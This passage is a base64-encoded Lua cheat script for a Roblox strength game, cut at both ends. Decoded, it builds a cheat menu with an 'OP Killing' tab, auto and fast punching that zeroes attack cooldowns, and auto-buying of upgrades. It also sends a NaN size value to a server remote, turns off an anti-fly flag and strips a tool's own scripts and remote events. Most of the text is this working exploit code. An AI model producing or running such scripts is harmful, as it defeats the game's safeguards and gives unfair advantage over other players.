RlT3B0aW9ucykgZG8KICAgIHVsdGltYXRlRHJvcGRvd246QWRkKHVsdGltYXRlKQplbmQKCi0tIEF1dG8gdXBncmFkZSB1bHRpbWF0ZSB0b2dnbGUKcGV0czpBZGRTd2l0Y2goIkF1dG8gQnV5IFVsdGltYXRlcyIsIGZ1bmN0aW9uKGJvb2wpCiAgICBfRy5BdXRvVXBncmFkZVVsdGltYXRlID0gYm9vbAogICAgCiAgICBpZiBib29sIHRoZW4KICAgICAgICBpZiBzZWxlY3RlZFVsdGltYXRlID09ICIiIHRoZW4KICAgICAgICAgICAgcHJpbnQoIlBsZWFzZSBzZWxlY3QgYW4gdWx0aW1hdGUgZmlyc3QhIikKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgcHJpbnQoIkF1dG8gdXBncmFkZSB1bHRpbWF0ZSBzdGFydGVkIGZvcjogIiAuLiBzZWxlY3RlZFVsdGltYXRlKQogICAgICAgIHNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgd2hpbGUgX0cuQXV0b1VwZ3JhZGVVbHRpbWF0ZSBhbmQgc2VsZWN0ZWRVbHRpbWF0ZSB+PSAiIiBkbwogICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLnJFdmVudHMudWx0aW1hdGVzUmVtb3RlOkludm9rZVNlcnZlcigKICAgICAgICAgICAgICAgICAgICAidXBncmFkZVVsdGltYXRlIiwKICAgICAgICAgICAgICAgICAgICBzZWxlY3RlZFVsdGltYXRlCiAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICBwcmludCgiVXBncmFkZWQgdWx0aW1hdGU6ICIgLi4gc2VsZWN0ZWRVbHRpbWF0ZSkKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgxKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbHNlCiAgICAgICAgcHJpbnQoIkF1dG8gY29tcHJhciB1bHRpbWF0ZXMiKQogICAgZW5kCmVuZCkKCmxvY2FsIFBsYXllcnMgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQpsb2NhbCBMb2NhbFBsYXllciA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKbG9jYWwgcGxheWVyV2hpdGVsaXN0ID0ge30KbG9jYWwgdGFyZ2V0UGxheWVyTmFtZXMgPSB7fQpsb2NhbCBhdXRvR29vZEthcm1hID0gZmFsc2UKbG9jYWwgYXV0b0JhZEthcm1hID0gZmFsc2UKbG9jYWwgYXV0b0tpbGwgPSBmYWxzZQpsb2NhbCBraWxsVGFyZ2V0ID0gZmFsc2UKbG9jYWwgc3B5aW5nID0gZmFsc2UKbG9jYWwgYXV0b0VxdWlwUHVuY2ggPSBmYWxzZQpsb2NhbCBhdXRvUHVuY2hOb0FuaW0gPSBmYWxzZQpsb2NhbCB0YXJnZXREcm9wZG93bkl0ZW1zID0ge30KbG9jYWwgYXZhaWxhYmxlVGFyZ2V0cyA9IHt9Cgpsb2NhbCBLaWxsZXIgPSB3aW5kb3c6QWRkVGFiKCJPUCBLaWxsaW5nIikKCmxvY2FsIGRyb3Bkb3duID0gS2lsbGVyOkFkZERyb3Bkb3duKCJTZWxlY3QgUGV0IiwgZnVuY3Rpb24odGV4dCkKICAgIGxvY2FsIHBldHNGb2xkZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXI6V2FpdEZvckNoaWxkKCJwZXRzRm9sZGVyIikKICAgIGZvciBfLCBmb2xkZXIgaW4gcGFpcnMocGV0c0ZvbGRlcjpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgIGlmIGZvbGRlcjpJc0EoIkZvbGRlciIpIHRoZW4KICAgICAgICAgICAgZm9yIF8sIHBldCBpbiBwYWlycyhmb2xkZXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5yRXZlbnRzLmVxdWlwUGV0RXZlbnQ6RmlyZVNlcnZlcigidW5lcXVpcFBldCIsIHBldCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKICAgIHRhc2sud2FpdCgwLjIpCiAgICBsb2NhbCBwZXROYW1lID0gdGV4dAogICAgbG9jYWwgcGV0c1RvRXF1aXAgPSB7fQogICAgZm9yIF8sIHBldCBpbiBwYWlycyhwZXRzRm9sZGVyLlVuaXF1ZTpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgIGlmIHBldC5OYW1lID09IHBldE5hbWUgdGhlbgogICAgICAgICAgICB0YWJsZS5pbnNlcnQocGV0c1RvRXF1aXAsIHBldCkKICAgICAgICBlbmQKICAgIGVuZAogICAgbG9jYWwgbWF4UGV0cyA9IDgKICAgIGxvY2FsIGVxdWlwcGVkQ291bnQgPSBtYXRoLm1pbigjcGV0c1RvRXF1aXAsIG1heFBldHMpCiAgICBmb3IgaSA9IDEsIGVxdWlwcGVkQ291bnQgZG8KICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuckV2ZW50cy5lcXVpcFBldEV2ZW50OkZpcmVTZXJ2ZXIoImVxdWlwUGV0IiwgcGV0c1RvRXF1aXBbaV0pCiAgICAgICAgdGFzay53YWl0KDAuMSkKICAgIGVuZAplbmQpCmRyb3Bkb3duOkFkZCgiV2lsZCBXaXphcmQiKQpkcm9wZG93bjpBZGQoIk1pZ2h0eSBNb25zdGVyIikKCktpbGxlcjpBZGRTd2l0Y2goIkF1dG8gUHVuY2ggW05vIEFuaW1hdGlvbl0iLCBmdW5jdGlvbihzdGF0ZSkKCWF1dG9QdW5jaE5vQW5pbSA9IHN0YXRlCgl0YXNrLnNwYXduKGZ1bmN0aW9uKCkKCQl3aGlsZSBhdXRvUHVuY2hOb0FuaW0gZG8KCQkJbG9jYWwgcHVuY2ggPSBMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKSBvciBMb2NhbFBsYXllci5DaGFyYWN0ZXIgYW5kIExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKQoJCQlpZiBwdW5jaCB0aGVuCgkJCQlpZiBwdW5jaC5QYXJlbnQgfj0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIHRoZW4KCQkJCQlwdW5jaC5QYXJlbnQgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKCQkJCWVuZAoJCQkJTG9jYWxQbGF5ZXIubXVzY2xlRXZlbnQ6RmlyZVNlcnZlcigicHVuY2giLCAicmlnaHRIYW5kIikKCQkJCUxvY2FsUGxheWVyLm11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIoInB1bmNoIiwgImxlZnRIYW5kIikKCQkJZWxzZQoJCQkJYXV0b1B1bmNoTm9BbmltID0gZmFsc2UKCQkJZW5kCgkJCXRhc2sud2FpdCgwLjAxKQoJCWVuZAoJZW5kKQplbmQpCgpLaWxsZXI6QWRkU3dpdGNoKCJBdXRvIFB1bmNoIiwgZnVuY3Rpb24oc3RhdGUpCglfRy5mYXN0SGl0QWN0aXZlID0gc3RhdGUKCWlmIHN0YXRlIHRoZW4KCQl0YXNrLnNwYXduKGZ1bmN0aW9uKCkKCQkJd2hpbGUgX0cuZmFzdEhpdEFjdGl2ZSBkbwoJCQkJbG9jYWwgcHVuY2ggPSBMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKQoJCQkJaWYgcHVuY2ggdGhlbgoJCQkJCXB1bmNoLlBhcmVudCA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgoJCQkJCWlmIHB1bmNoOkZpbmRGaXJzdENoaWxkKCJhdHRhY2tUaW1lIikgdGhlbgoJCQkJCQlwdW5jaC5hdHRhY2tUaW1lLlZhbHVlID0gMAoJCQkJCWVuZAoJCQkJZW5kCgkJCQl0YXNrLndhaXQoMC4xKQoJCQllbmQKCQllbmQpCgkJdGFzay5zcGF3bihmdW5jdGlvbigpCgkJCXdoaWxlIF9HLmZhc3RIaXRBY3RpdmUgZG8KCQkJCWxvY2FsIHB1bmNoID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIGFuZCBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlB1bmNoIikKCQkJCWlmIHB1bmNoIHRoZW4KCQkJCQlwdW5jaDpBY3RpdmF0ZSgpCgkJCQllbmQKCQkJCXRhc2sud2FpdCgwLjEpCgkJCWVuZAoJCWVuZCkKCWVsc2UKCQlsb2NhbCBwdW5jaCA9IExvY2FsUGxheWVyLkNoYXJhY3RlciBhbmQgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJQdW5jaCIpCgkJaWYgcHVuY2ggdGhlbgoJCQlwdW5jaC5QYXJlbnQgPSBMb2NhbFBsYXllci5CYWNrcGFjawoJCWVuZAoJZW5kCmVuZCkKCktpbGxlcjpBZGRTd2l0Y2goIkZhc3QgUHVuY2giLCBmdW5jdGlvbihzdGF0ZSkKCV9HLmF1dG9QdW5jaEFjdGl2ZSA9IHN0YXRlCglpZiBzdGF0ZSB0aGVuCgkJdGFzay5zcGF3bihmdW5jdGlvbigpCgkJCXdoaWxlIF9HLmF1dG9QdW5jaEFjdGl2ZSBkbwoJCQkJbG9jYWwgcHVuY2ggPSBMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKQoJCQkJaWYgcHVuY2ggdGhlbgoJCQkJCXB1bmNoLlBhcmVudCA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgoJCQkJCWlmIHB1bmNoOkZpbmRGaXJzdENoaWxkKCJhdHRhY2tUaW1lIikgdGhlbgoJCQkJCQlwdW5jaC5hdHRhY2tUaW1lLlZhbHVlID0gMAoJCQkJCWVuZAoJCQkJZW5kCgkJCQl0YXNrLndhaXQoKQoJCQllbmQKCQllbmQpCgkJdGFzay5zcGF3bihmdW5jdGlvbigpCgkJCXdoaWxlIF9HLmF1dG9QdW5jaEFjdGl2ZSBkbwoJCQkJbG9jYWwgcHVuY2ggPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIgYW5kIExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKQoJCQkJaWYgcHVuY2ggdGhlbgoJCQkJCXB1bmNoOkFjdGl2YXRlKCkKCQkJCWVuZAoJCQkJdGFzay53YWl0KCkKCQkJZW5kCgkJZW5kKQoJZWxzZQoJCWxvY2FsIHB1bmNoID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIGFuZCBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlB1bmNoIikKCQlpZiBwdW5jaCB0aGVuCgkJCXB1bmNoLlBhcmVudCA9IExvY2FsUGxheWVyLkJhY2twYWNrCgkJZW5kCgllbmQKZW5kKQoKbG9jYWwgUGxheWVycyA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpCmxvY2FsIFJ1blNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIlJ1blNlcnZpY2UiKQpsb2NhbCBSZXBsaWNhdGVkU3RvcmFnZSA9IGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKQpsb2NhbCBTdGFydGVyUGFjayA9IGdhbWU6R2V0U2VydmljZSgiU3RhcnRlclBhY2siKQpsb2NhbCBsaWdodGluZyA9IGdhbWU6R2V0U2VydmljZSgiTGlnaHRpbmciKQpsb2NhbCBMb2NhbFBsYXllciA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKCi0tIFN0YXRlICYgY29ubmVjdGlvbiB0cmFja2luZwpsb2NhbCBjb21ib0FjdGl2ZSA9IGZhbHNlCmxvY2FsIGNvbm5lY3Rpb25zID0ge30gLS0gbWFwIGtleXMgLT4gUkJYU2NyaXB0Q29ubmVjdGlvbiAvIHRhc2sudGhyZWFkCmxvY2FsIGxvb3BzID0ge30gLS0gc3RvcmUgY29yb3V0aW5lL3RocmVhZCByZWZlcmVuY2VzIHRvIGFsbG93IHNhZmUgc3RvcHBpbmcKCmxvY2FsIGZ1bmN0aW9uIHNhZmVEaXNjb25uZWN0KGtleSkKCWxvY2FsIGNvbm4gPSBjb25uZWN0aW9uc1trZXldCglpZiBub3QgY29ubiB0aGVuIHJldHVybiBlbmQKCXBjYWxsKGZ1bmN0aW9uKCkKCQlpZiB0eXBlb2YoY29ubikgPT0gIlJCWFNjcmlwdENvbm5lY3Rpb24iIGFuZCBjb25uLkRpc2Nvbm5lY3QgdGhlbgoJCQljb25uOkRpc2Nvbm5lY3QoKQoJCWVsc2VpZiB0eXBlKGNvbm4pID09ICJ0YWJsZSIgYW5kIGNvbm4uRGlzY29ubmVjdCB0aGVuCgkJCWNvbm46RGlzY29ubmVjdCgpCgkJZW5kCgllbmQpCgljb25uZWN0aW9uc1trZXldID0gbmlsCmVuZAoKbG9jYWwgZnVuY3Rpb24gc3RvcExvb3BzKCkKCWZvciBrLCB0aHIgaW4gcGFpcnMobG9vcHMpIGRvCgkJbG9vcHNba10gPSBuaWwKCWVuZAplbmQKCmxvY2FsIGZ1bmN0aW9uIGNsZWFudXBBbGwoKQoJX0cuQXV0b1B1bmNoVG9nZ2xlID0gZmFsc2UKCV9HLkF1dG9Qcm90ZWluRWdnID0gZmFsc2UKCWdldGdlbnYoKS5BbnRpRmx5QWN0aXZlID0gZmFsc2UKCglmb3IgaywgXyBpbiBwYWlycyhjb25uZWN0aW9ucykgZG8KCQlzYWZlRGlzY29ubmVjdChrKQoJZW5kCgljb25uZWN0aW9ucyA9IHt9CglzdG9wTG9vcHMoKQplbmQKCmxvY2FsIGZ1bmN0aW9uIHJlc3Bhd25QbGF5ZXIoKQoJcGNhbGwoZnVuY3Rpb24oKQoJCWlmIExvY2FsUGxheWVyIGFuZCBMb2NhbFBsYXllcjpJc0EoIlBsYXllciIpIHRoZW4KCQkJaWYgcGNhbGwoZnVuY3Rpb24oKSBMb2NhbFBsYXllcjpMb2FkQ2hhcmFjdGVyKCkgZW5kKSB0aGVuIHJldHVybiBlbmQKCQkJcGNhbGwoZnVuY3Rpb24oKQoJCQkJbG9jYWwgU3RhcnRlckd1aSA9IGdhbWU6R2V0U2VydmljZSgiU3RhcnRlckd1aSIpCgkJCQlTdGFydGVyR3VpOlNldENvcmUoIlJlc2V0QnV0dG9uQ2FsbGJhY2siLCB0cnVlKQoJCQllbmQpCgkJZW5kCgllbmQpCmVuZAoKbG9jYWwgZnVuY3Rpb24gYXBwbHlTaXplTmFOKCkKCXBjYWxsKGZ1bmN0aW9uKCkKCQlsb2NhbCBldmVudHMgPSBSZXBsaWNhdGVkU3RvcmFnZTpGaW5kRmlyc3RDaGlsZCgickV2ZW50cyIpCgkJaWYgZXZlbnRzIHRoZW4KCQkJbG9jYWwgY2hhbmdlID0gZXZlbnRzOkZpbmRGaXJzdENoaWxkKCJjaGFuZ2VTcGVlZFNpemVSZW1vdGUiKQoJCQlpZiBjaGFuZ2UgYW5kIGNoYW5nZS5JbnZva2VTZXJ2ZXIgdGhlbgoJCQkJcGNhbGwoZnVuY3Rpb24oKQoJCQkJCWNoYW5nZTpJbnZva2VTZXJ2ZXIoImNoYW5nZVNpemUiLCAwLzApCgkJCQllbmQpCgkJCWVuZAoJCWVuZAoJZW5kKQplbmQKCmxvY2FsIGZ1bmN0aW9uIHN0YXJ0QXV0b1B1bmNoKCkKCV9HLkF1dG9QdW5jaFRvZ2dsZSA9IHRydWUKCWxvY2FsIGlkID0gIkF1dG9QdW5jaCIKCWxvb3BzW2lkXSA9IHRydWUKCXRhc2suc3Bhd24oZnVuY3Rpb24oKQoJCWxvY2FsIGJhY2twYWNrID0gTG9jYWxQbGF5ZXI6V2FpdEZvckNoaWxkKCJCYWNrcGFjayIpCgkJbG9jYWwgaGFuZCA9ICJyaWdodEhhbmQiCgkJbG9jYWwgZnVuY3Rpb24gZ2V0TXVzY2xlRXZlbnQoKSByZXR1cm4gTG9jYWxQbGF5ZXI6RmluZEZpcnN0Q2hpbGQoIm11c2NsZUV2ZW50IikgZW5kCgoJCXNhZmVEaXNjb25uZWN0KCJDaGFyQWRkZWRGb3JBdXRvUHVuY2giKQoJCWNvbm5lY3Rpb25zLkNoYXJBZGRlZEZvckF1dG9QdW5jaCA9IExvY2FsUGxheWVyLkNoYXJhY3RlckFkZGVkOkNvbm5lY3QoZnVuY3Rpb24oY2hhcikKCQkJaWYgY29tYm9BY3RpdmUgYW5kIGNvbm5lY3Rpb25zLkh1bWFub2lkUmVzZXRIb29rID09IG5pbCB0aGVuCgkJCQlsb2NhbCBodW0gPSBjaGFyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKQoJCQkJaWYgaHVtIHRoZW4KCQkJCQlzYWZlRGlzY29ubmVjdCgiUmVzZXREZWF0aCIpCgkJCQkJY29ubmVjdGlvbnMuUmVzZXREZWF0aCA9IGh1bS5EaWVkOkNvbm5lY3QoZnVuY3Rpb24oKQoJCQkJCQl0YXNrLndhaXQoMC41KQoJCQkJCQlyZXNwYXduUGxheWVyKCkKCQkJCQllbmQpCgkJCQllbmQKCQkJZW5kCgkJZW5kKQoKCQlzYWZlRGlzY29ubmVjdCgiQmFja3BhY2tDaGlsZEZvckF1dG9QdW5jaCIpCgkJY29ubmVjdGlvbnMuQmFja3BhY2tDaGlsZEZvckF1dG9QdW5jaCA9IExvY2FsUGxheWVyLkNoaWxkQWRkZWQ6Q29ubmVjdChmdW5jdGlvbihjaGlsZCkKCQkJaWYgY2hpbGQuTmFtZSA9PSAiQmFja3BhY2siIHRoZW4KCQkJCWJhY2twYWNrID0gY2hpbGQKCQkJZW5kCgkJZW5kKQoKCQl3aGlsZSBfRy5BdXRvUHVuY2hUb2dnbGUgYW5kIGxvb3BzW2lkXSBkbwoJCQlsb2NhbCBtdXNjbGVFdmVudCA9IGdldE11c2NsZUV2ZW50KCkKCQkJbG9jYWwgY2hhcmFjdGVyID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCgkJCWlmIGNoYXJhY3RlciBhbmQgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpIGFuZCBtdXNjbGVFdmVudCB0aGVuCgkJCQlsb2NhbCBwdW5jaEVxdWlwcGVkID0gY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJQdW5jaCIpCgkJCQlsb2NhbCBwdW5jaEluQmFja3BhY2sgPSAoTG9jYWxQbGF5ZXI6RmluZEZpcnN0Q2hpbGQoIkJhY2twYWNrIikgYW5kIExvY2FsUGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJQdW5jaCIpKQoJCQkJaWYgbm90IHB1bmNoRXF1aXBwZWQgYW5kIHB1bmNoSW5CYWNrcGFjayB0aGVuCgkJCQkJcGNhbGwoZnVuY3Rpb24oKSBjaGFyYWN0ZXIuSHVtYW5vaWQ6RXF1aXBUb29sKHB1bmNoSW5CYWNrcGFjaykgZW5kKQoJCQkJZW5kCgkJCQlwY2FsbChmdW5jdGlvbigpIG11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIoInB1bmNoIiwgaGFuZCkgZW5kKQoJCQllbmQKCQkJdGFzay53YWl0KDAuMDAwMSkKCQllbmQKCWVuZCkKZW5kCgpsb2NhbCBmdW5jdGlvbiBzdGFydFByb3RlaW5FZ2dMb2dpYygpCglfRy5BdXRvUHJvdGVpbkVnZyA9IHRydWUKCWxvY2FsIGlkID0gIlByb3RlaW5FZ2ciCglsb29wc1tpZF0gPSB0cnVlCgl0YXNrLnNwYXduKGZ1bmN0aW9uKCkKCQlsb2NhbCB0b29sTmFtZSA9ICJQcm90ZWluIEVnZyIKCQlsb2NhbCBjaGFyYWN0ZXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIgb3IgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpCgoJCWxvY2FsIGZ1bmN0aW9uIHJlc3RvcmVWaXNpYmlsaXR5KHRvb2wpCgkJCWZvciBfLCBwYXJ0IGluIGlwYWlycyh0b29sOkdldERlc2NlbmRhbnRzKCkpIGRvCgkJCQlpZiBwYXJ0OklzQSgiQmFzZVBhcnQiKSB0aGVuCgkJCQkJcGNhbGwoZnVuY3Rpb24oKSBwYXJ0LlRyYW5zcGFyZW5jeSA9IDAgZW5kKQoJCQkJCXBjYWxsKGZ1bmN0aW9uKCkgcGFydC5Mb2NhbFRyYW5zcGFyZW5jeU1vZGlmaWVyID0gMCBlbmQpCgkJCQllbmQKCQkJZW5kCgkJZW5kCgoJCWxvY2FsIGZ1bmN0aW9uIGZpbmRUb29sKCkKCQkJbG9jYWwgdG9vbCA9IChMb2NhbFBsYXllcjpGaW5kRmlyc3RDaGlsZCgiQmFja3BhY2siKSBhbmQgTG9jYWxQbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQodG9vbE5hbWUpKQoJCQlpZiB0b29sIHRoZW4gcmV0dXJuIHRvb2wgZW5kCgkJCXRvb2wgPSBTdGFydGVyUGFjazpGaW5kRmlyc3RDaGlsZCh0b29sTmFtZSkKCQkJaWYgdG9vbCB0aGVuIHJldHVybiB0b29sIGVuZAoJCQl0b29sID0gUmVwbGljYXRlZFN0b3JhZ2U6RmluZEZpcnN0Q2hpbGQodG9vbE5hbWUpCgkJCXJldHVybiB0b29sCgkJZW5kCgoJCWxvY2FsIGZ1bmN0aW9uIGZvcmNlRXF1aXAodG9vbCkKCQkJaWYgbm90IChjaGFyYWN0ZXIgYW5kIGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKSkgdGhlbiByZXR1cm4gZW5kCgkJCXBjYWxsKGZ1bmN0aW9uKCkgY2hhcmFjdGVyLkh1bWFub2lkOkVxdWlwVG9vbCh0b29sKSBlbmQpCgkJCXRhc2sud2FpdCgwLjEpCgkJCWlmIG5vdCBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQodG9vbE5hbWUpIHRoZW4KCQkJCXBjYWxsKGZ1bmN0aW9uKCkgdG9vbC5QYXJlbnQgPSBjaGFyYWN0ZXIgZW5kKQoJCQkJdGFzay53YWl0KDAuMSkKCQkJZW5kCgkJCWxvY2FsIGVxdWlwcGVkID0gY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKHRvb2xOYW1lKQoJCQlpZiBlcXVpcHBlZCB0aGVuIHJlc3RvcmVWaXNpYmlsaXR5KGVxdWlwcGVkKSBlbmQKCQllbmQKCgkJbG9jYWwgZnVuY3Rpb24gc2FuaXRpemVUb29sKHRvb2wpCgkJCWZvciBfLCBkZXNjIGluIGlwYWlycyh0b29sOkdldERlc2NlbmRhbnRzKCkpIGRvCgkJCQlpZiBkZXNjOklzQSgiU2NyaXB0IikgdGhlbgoJCQkJCXBjYWxsKGZ1bmN0aW9uKCkgZGVzYzpEZXN0cm95KCkgZW5kKQoJCQkJZWxzZWlmIGRlc2M6SXNBKCJMb2NhbFNjcmlwdCIpIHRoZW4KCQkJCQlwY2FsbChmdW5jdGlvbigpIGRlc2MuRGlzYWJsZWQgPSB0cnVlIGVuZCkKCQkJCWVuZAoJCQkJaWYgZGVzYzpJc0EoIlJlbW90ZUV2ZW50IikgdGhlbgoJCQkJCXBjYWxsKGZ1bmN0aW9uKCkgZGVzYy5GaXJlU2VydmVyID0gZnVuY3Rpb24oKSBlbmQgZW5kKQoJCQkJZW5kCgkJCWVuZAoJCWVuZAoKCQlsb2NhbCBmdW5jdGlvbiBlcXVpcElmTmVlZGVkKCkKCQkJaWYgbm90IF9HLkF1dG9Qcm90ZWluRWdnIHRoZW4gcmV0dXJuIGVuZAoJCQljaGFyYWN0ZXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKCQkJbG9jYWwgZXF1aXBwZWQgPSBjaGFyYWN0ZXIgYW5kIGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCh0b29sTmFtZSkKCQkJbG9jYWwgbmVlZEVxdWlwID0gZmFsc2UKCQkJaWYgbm90IGVxdWlwcGVkIHRoZW4KCQkJCW5lZWRFcXVpcCA9IHRydWUKCQkJZWxzZQoJCQkJZm9yIF8sIHBhcnQgaW4gaXBhaXJzKGVxdWlwcGVkOkdldERlc2NlbmRhbnRzKCkpIGRvCgkJCQkJaWYgcGFydDpJc0EoIkJhc2VQYXJ0IikgYW5kIHBhcnQuVHJhbnNwYXJlbmN5ID4gMCB0aGVuCgkJCQkJCW5lZWRFcXVpcCA9IHRydWUKCQkJCQkJYnJlYWsKCQkJCQllbmQKCQkJCWVuZAoJCQllbmQKCQkJaWYgbmVlZEVxdWlwIHRoZW4KCQkJCWxvY2FsIHRvb2wgPSBmaW5kVG9vbCgpCgkJCQlpZiB0b29sIHRoZW4KCQkJCQlpZiB0b29sLlBhcmVudCB+PSAoTG9jYWxQbGF5ZXI6RmluZEZpcnN0Q2hpbGQoIkJhY2twYWNrIikgYW5kIExvY2FsUGxheWVyLkJhY2twYWNrKSB0aGVuCgkJCQkJCWxvY2FsIGNsb25lID0gdG9vbDpDbG9uZSgpCgkJCQkJCWNsb25lLlBhcmVudCA9IExvY2FsUGxheWVyOkZpbmRGaXJzdENoaWxkKCJCYWNrcGFjayIpIG9yIExvY2FsUGxheWVyCgkJCQkJCXRvb2wgPSBjbG9uZQoJCQkJCWVuZAoJCQkJCXNhbml0aXplVG9vbCh0b29sKQoJCQkJCWZvcmNlRXF1aXAodG9vbCkKCQkJCWVuZAoJCQllbmQKCQllbmQKCgkJbG9jYWwgZnVuY3Rpb24gbW9uaXRvclRvb2xDb250YWluZXIoY29udGFpbmVyKQoJCQlpZiBub3QgY29udGFpbmVyIHRoZW4gcmV0dXJuIGVuZAoJCQlmb3IgXywgdG9vbCBpbiBpcGFpcnMoY29udGFpbmVyOkdldENoaWxkcmVuKCkpIGRvCgkJCQlpZiB0b29sOklzQSgiVG9vbCIpIGFuZCB0b29sLk5hbWUgPT0gdG9vbE5hbWUgdGhlbgoJCQkJCXNhbml0aXplVG9vbCh0b29sKQoJCQkJZW5kCgkJCWVuZAoJCQlsb2NhbCBjb25uID0gY29udGFpbmVyLkNoaWxkQWRkZWQ6Q29ubmVjdChmdW5jdGlvbihjaGlsZCkKCQkJCWlmIGNoaWxkOklzQSgiVG9vbCIpIGFuZCBjaGlsZC5OYW1lID09IHRvb2xOYW1lIHRoZW4KCQkJCQl0YXNrLmRlZmVyKGZ1bmN0aW9uKCkKCQkJCQkJc2FuaXRpemVUb29sKGNoaWxkKQoJCQkJCWVuZCkKCQkJCWVuZAoJCQllbmQpCgkJCXJldHVybiBjb25uCgkJZW5kCgoJCXNhZmVEaXNjb25uZWN0KCJNb25pdG9yQmFja3BhY2siKQoJCXNhZmVEaXNjb25uZWN0KCJNb25pdG9yQ2hhcmFjdGVyIikKCQljb25uZWN0aW9ucy5Nb25pdG9yQmFja3BhY2sgPSBtb25pdG9yVG9vbENvbnRhaW5lcihMb2NhbFBsYXllcjpGaW5kRmlyc3RDaGlsZCgiQmFja3BhY2siKSBvciBMb2NhbFBsYXllcjpXYWl0Rm9yQ2hpbGQoIkJhY2twYWNrIikpCgkJY29ubmVjdGlvbnMuTW9uaXRvckNoYXJhY3RlciA9IG1vbml0b3JUb29sQ29udGFpbmVyKExvY2FsUGxheWVyLkNoYXJhY3RlcikKCgkJc2FmZURpc2Nvbm5lY3QoIkNoYXJhY3RlckFkZGVkUHJvdGVpbiIpCgkJY29ubmVjdGlvbnMuQ2hhcmFjdGVyQWRkZWRQcm90ZWluID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6Q29ubmVjdChmdW5jdGlvbihjaGFyKQoJCQljaGFyYWN0ZXIgPSBjaGFyCgkJCXRhc2sud2FpdCgxKQoJCQlzYWZlRGlzY29ubmVjdCgiTW9uaXRvckJhY2twYWNrIikKCQkJc2FmZURpc2Nvbm5lY3QoIk1vbml0b3JDaGFyYWN0ZXIiKQoJCQljb25uZWN0aW9ucy5Nb25pdG9yQmFja3BhY2sgPSBtb25pdG9yVG9vbENvbnRhaW5lcihMb2NhbFBsYXllcjpGaW5kRmlyc3RDaGlsZCgiQmFja3BhY2siKSBvciBMb2NhbFBsYXllcjpXYWl0Rm9yQ2hpbGQoIkJhY2twYWNrIikpCgkJCWNvbm5lY3Rpb25zLk1vbml0b3JDaGFyYWN0ZXIgPSBtb25pdG9yVG9vbENvbnRhaW5lcihjaGFyKQoJCQllcXVpcElmTmVlZGVkKCkKCQllbmQpCgoJCXNhZmVEaXNjb25uZWN0KCJCYWNrcGFja0NoaWxkUHJvdGVpbiIpCgkJY29ubmVjdGlvbnMuQmFja3BhY2tDaGlsZFByb3RlaW4gPSBMb2NhbFBsYXllcjpXYWl0Rm9yQ2hpbGQoIkJhY2twYWNrIikuQ2hpbGRBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKGNoaWxkKQoJCQlpZiBfRy5BdXRvUHJvdGVpbkVnZyBhbmQgY2hpbGQuTmFtZSA9PSB0b29sTmFtZSB0aGVuCgkJCQl0YXNrLndhaXQoMC4yKQoJCQkJZXF1aXBJZk5lZWRlZCgpCgkJCWVuZAoJCWVuZCkKCgkJd2hpbGUgX0cuQXV0b1Byb3RlaW5FZ2cgYW5kIGxvb3BzW2lkXSBkbwoJCQlwY2FsbChlcXVpcElmTmVlZGVkKQoJCQl